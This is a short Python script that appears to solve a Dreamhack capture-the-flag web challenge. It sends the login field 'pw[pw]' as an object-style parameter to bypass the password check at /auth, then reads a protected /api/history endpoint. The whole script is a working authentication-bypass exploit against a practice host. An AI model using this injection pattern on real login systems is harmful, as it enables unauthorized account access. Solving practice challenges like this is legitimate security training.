import requests

sess = requests.Session()
URL = 'http://host3.dreamhack.games:12850'

data = {
    'id': 'admin_inject',
    'pw[pw]': 1,
    'login': 'Login'
}

sess.post(f"{URL}/auth", data)
res = sess.get(f"{URL}/api/history/1")
print(res.json()['data'])
